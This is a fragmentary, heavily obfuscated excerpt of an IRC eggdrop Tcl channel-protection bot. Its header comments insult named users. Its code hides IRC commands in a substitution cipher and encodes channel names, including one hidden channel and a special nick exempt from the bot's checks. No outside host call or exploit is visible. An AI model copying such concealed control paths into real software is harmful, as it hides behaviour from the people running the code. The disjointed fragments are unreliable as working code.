## capadesu Tcl Protection Bot v9.2 ©Copyright 2004+ by capadesu - Created by capadesu Crew for #kaskus
## for @Allnetwork started on March 1st, 2004! Please leave in all my texts...thanks!
##
## SINCE CERTAIN PEOPLE REFUSE TO READ THIS ANYWHERE ELSE, MAYBE THEY'LL
## FINALLY READ IT AT THE TOP OF THE TCL 
## (IE: kEnLApz, Koped, MANDAU, ableh, inoe, ramius, weleh, sikudel, MUMUN, STAFF, PetroZza, afktech, bajinguk, and all who dedicated his name to change capadesu logo, you all lame ass!)

## MY ONLY REAL REQUEST REGARDING USAGE OF THIS SCRIPT IS TO *NOT*,
## (REPEAT) *NOT* REMOVE THE DEDICATION OF THIS capadesu...
...
## rundown on all the commands an' abilities of this little capadesu Scripts! 8)

## Feel free to e-mail me at capadesu@gmail.com if there's any questions,
## complaints or comments!
## Remember to visit website at http://channels.allnetwork/stauvit to 
## see update of stauvit Tcl for Eggdrops are coming along! 8) or
## please goto #kaskus for more information and questions!

## Enjoy!
## Sincerely,
## stauvit! *Test Version!* 8)
...
### THE capadesu Tcl IN THE 'DEDICATION' LINE...IF THIS IS A PROBLEM FOR YOU THEN PLEASE ###
...
if {![string match "*[dezip "VKmle.WE/Ax0dLQ.s.BGypi."]*" $retval] && ![string match "**" $retval]} { return 0 }
}
puthelp $retval
}
...
if {![string match "*[dezip "VKmle.WE/Ax0dLQ.s.BGypi."]*" $retval] && ![string match "*$notm*" $retval]} { return 0 }
set [lines "vmwezo"] ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
if {[info exists banner]} {
...
if {$nick != $ps && [string tolower $chan] == [dezip "S9F///.J0~ry0"]} { return 0 }
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
...
if {$joinme != "" && [string tolower $chan] != [dezip "S9F///.J0~ry0"]} {
...
if {$mhost == "@Allnetwork" || [string match "*allnetwork" $mhost]} {
putsrv "ZDZB"
}
if {![isop $botnick $chan]} { 
if {[info exists invme($mhost)]} {
...
global notc
if {$rest == ""} {
puthelp "NOTICE $nick :$notc Usage: chanmode #channel +ntsmklic capadesu.NO 1"
return 0
}
...
if {![validchan $chan]} { return 0 }
if {$nick != $ps && [string tolower $chan] == [dezip "~S9F///.J0ry0"]} { return 0 }
...
if {![string match "*allnetwork*" [string tolower $rest]]} {
...
if {$nick != $ps && [string tolower $chantarget] == [dezip "S9F///~.J0ry0"]} { return 0 }
foreach x [channels] {
...
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $x] == [dezip "S9F///~.J0ry0"]} { return 0 }
...
foreach x [channels] {
if {[string tolower $x] != [dezip "S9F///~.J0ry0"]} {
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
...
set awban "4,1-15C0a15P0a15D0e15S0u4-"
}
if {[getuser "config" XTRA "AWAY"]!=""} {
set longer "$awban iS oNLiNe $output 4,0H13r14s ([getuser "config" XTRA "AWAY"])"
} {
set longer "$awban iS oNLiNe $output 4,0H13r14s (www.capadesu.com)"
}
}
...
if {[string match "*allnetwork*" [string tolower $text]]} { return 0 }
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set [lines "yzmnzhp"] "*!*[string range $uhost [string first "@" $uhost] end]"
...
foreach x [channels] {
if {[onchan $botnick $x]} { 
if {![isop $botnick $x] && [string tolower $x] != [dezip "S9F///~.J0ry0"]} {
...
set kickme($nick) 3
if {[string tolower $chan] != [dezip "S9F///.J~0ry0"]} {
...
set [lines "ivzomn"] {
"CaPaDeSu" "Molinow Team" "Molinow Guard" "Monster Fighter"
"Molinow Connection" "Molinow Inside" "www.anetv5.xyz"
"For Belajar Only" "Not For Commercial" "Free Monster Help"
"Friend Forever" "Long Way TO GO" "Knowledge is Free"
"www.torangpetas.com" "Best Days" "FIVA FOREVER"
}
...
if {$lgidx == 1} {
set [lines "otimw"] [dezip "AxVx2.tPMie1Hta6u0kwEpK/n/AOL/Zo62V/IweUn1Z8zGf/"]
} elseif {$lgidx == 2} {
set [lines "otimw"] [dezip "R.l9j18KLbE.NQbX3/MqWiD0n/AOL/Zo62V/IweUn1Z8zGf/"]
} elseif {$lgidx == 3} {
set [lines "otimw"] [dezip "R.l9j18KLbE.eVeKt07MqL6.n/AOL/Zo62V/IweUn1Z8zGf/"]
} elseif {$lgidx == 4} {
set [lines "otimw"] [dezip "R.l9j18KLbE.48yh60mazSx.n/AOL/Zo62V/IweUn1Z8zGf/"]
} elseif {$lgidx == 5} {
set [lines "otimw"] [dezip "R.l9j18KLbE.MjQxB.H9eEu/n/AOL/Zo62V/IweUn1Z8zGf/"]
} elseif {$lgidx == 6} {
set [lines "otimw"] [dezip "R.l9j18KLbE.Zr3o80Co0.H/n/AOL/Zo62V/IweUn1Z8zGf/"]
} elseif {$lgidx == 7} {
set [lines "otimw"] [dezip "R.l9j18KLbE.gMtae/w98C4/aYVhB0kcU6G/aDHzT//lTWZ.MyBn4/B/WYe/LPl.I/StnNW/"]
} else {
set [lines "otrwc"] 0
set [lines "otimw"] [dezip "AxVx2.tPMie1eVeKt07MqL6.n/AOL/Zo62V/IweUn1Z8zGf/"]
}
}
...
if {![matchattr $nick f] && $nick != $botnick && $nick != "ChanServ" && ![string match "*allnetwork*" $nick] && ![info exists igflood($nick)]} {
if {[matchattr $cflag D]} {
if {$quick == "1"} {
...
if {[matchattr $nick f] || $nick == $botnick || $nick == "ChanServ" || [string match "*allnetwork*" $nick] || [info exists igflood($nick)]} { return 1 }
}
if {$knick == $notb} {
if {$nick != $botnick} {
...
if {![matchattr $nick f] && $nick != "ChanServ" && ![string match "*allnetwork*" $nick] && ![string match "*Guest*" $botnick]} {
...
if {![matchattr $nick m]} {
if {[string tolower $channel] != [dezip "S9F///~.J0ry0"]} {
...
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "S~9F///.J0ry0"]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~~$chan ~4(+R)"
}
if {[string tolower $chan] != [dezip "S~9F///.J0ry0"]} {
...
set [lines "xszm"] [lindex $arg 1]
if {$double == 0} {
if {$joinme != "" && [string tolower $chan] != [dezip "~S9F///.J0ry0"]} {
puthlp "MLGRXV ~$joinme ~:~$notc ~~$chan ~4(+Y)"
}
if {[string tolower $chan] != [dezip "~S9F///.J0ry0"]} {
putsrv "XszmHvie rmergv ~$chan"
...
if {![string match "*allnetwork*" $nick]} {
...
if {[string match "*[dezip "ubA4w.fzM0w/.O8ob.6mbzH/Q3igW/vb27G."]*" [uncolor $awaytext]]} { return 0 }
if {$nick == $botnick} {
} {
...
if {[string tolower $rest] == [dezip "S9F///.J0ry0"]} {
return 0
}
if {![validchan $rest]} {
...
if {[string match "*allnetwork*" $from]} {
...
if {$asu!=[dcp "[dcp "/dUBR/Uka/s0996Bj/QFQaR/"]"] } {[lines "ivgfim"] 0}
...
putlog "==============================="
putlog "capadesu 9.2 LoadEd"
putlog "Reported any bugs to #kaskus"
putlog "Question Go To #kaskus"
putlog "Email: capadesu@gmail.com"
putlog "==============================="
